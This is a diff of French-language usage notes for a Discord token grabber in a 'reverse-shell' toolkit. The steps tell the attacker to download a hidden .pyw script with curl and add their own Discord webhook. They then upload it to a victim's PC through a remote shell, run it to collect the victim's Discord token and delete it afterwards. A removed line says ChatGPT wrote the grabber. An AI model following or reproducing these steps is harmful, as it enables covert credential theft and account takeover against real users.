@@ -1,16 +1,20 @@
 # Programme réalisé : Aucune idée, mais pas moi 
 
 # Entrain d'être écrit, via ce programme vous pourrez mettre un webhook discord est récupéré automatiquement le token discord de la cible
-# Token Grabber Discord très très classique fait par ChatGPT vous pourrez le cloner comme ça sur le pc de la cible
+
 # Etape 1 :
+# A faire sur votre VPS
 # curl https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/addons/discord-token.pyw -o token.pyw 
 # pensez bien à mettre '.pyw' et pas '.py' pour éviter que ça soit visible
-# pensez bien également à installer le fichier sur le pc de la victime avec votre webhook (la commande au-dessus est un exemple car il ne contiendra pas votre webhook)
+# éditez pour mettre votre webhook dans le fichier
 
 # Etape 2 :
-# python token.pyw
+# upload [Chemin d'acces du fichier] (Regardez le README.md, si vous avez besoin d'aide)
 
 # Etape 3 :
+# python token.pyw (dans le dossier Downloads, PS: Pour allez sur le fihicer 'cd .. && cd .. && cd Downloads && python token.pyw', CECI EST UN EXEMPLE TROUVEZ OU EST LE FICHIER en utilisant des DIR)
+
+# Etape 4 :
 # del token.pyw
 
 ########################################################################################################################################
